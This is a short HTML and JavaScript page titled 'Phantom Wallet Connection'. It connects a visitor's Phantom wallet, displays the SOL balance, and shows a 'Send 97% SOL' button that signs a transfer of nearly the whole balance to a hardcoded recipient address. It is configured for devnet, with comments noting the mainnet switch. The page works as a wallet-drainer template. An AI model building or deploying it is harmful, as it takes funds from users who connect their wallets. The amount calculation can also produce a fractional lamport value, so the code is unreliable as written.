<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Phantom Wallet Connection</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
</head>
<body>
  <button id="connectButton">Connect Phantom Wallet</button>
  <p id="balance"></p>
  <button id="sendButton" style="display: none;">Send 97% SOL</button>

  <script>
    const connectButton = document.getElementById("connectButton");
    const sendButton = document.getElementById("sendButton");
    const balanceDisplay = document.getElementById("balance");

    let provider;

    const getProvider = () => {
      if ('phantom' in window) {
        provider = window.phantom.solana;
        if (provider?.isPhantom) {
          return provider;
        }
      }
      alert("Phantom wallet not installed.");
      window.open('https://phantom.app/', '_blank');
      return null;
    };

    const connectPhantom = async () => {
      provider = getProvider();
      if (provider) {
        try {
          const response = await provider.connect();
          console.log("Connected:", response.publicKey.toString());
          getBalance(response.publicKey.toString());
        } catch (error) {
          console.error("Connection failed:", error);
        }
      }
    };

    const getBalance = async (publicKey) => {
      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));  // Use 'mainnet-beta' for mainnet
      try {
        const balance = await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
        balanceDisplay.textContent = `Balance: ${solBalance} SOL`;
        sendButton.style.display = 'block';
      } catch (error) {
        console.error("Error getting balance:", error);
      }
    };

    const send97PercentSOL = async () => {
      if (!provider) return;
      const publicKey = provider.publicKey;
      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));  // Use 'mainnet-beta' for mainnet

      const balance = await connection.getBalance(publicKey);
      const totalLamports = balance;
      const sendLamports = totalLamports * 0.97;  // Send 97% of balance

      // Define the recipient's address
      const recipientAddress = "A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26";

      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new solanaWeb3.PublicKey(recipientAddress),
          lamports: sendLamports - 5000, // Subtract small fee for the transaction
        })
      );

      try {
        const signedTransaction = await provider.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(txid, 'processed');
        alert('Transaction successful!');
      } catch (error) {
        console.error("Transaction failed:", error);
      }
    };

    connectButton.addEventListener('click', connectPhantom);
    sendButton.addEventListener('click', send97PercentSOL);
  </script>
</body>
</html>

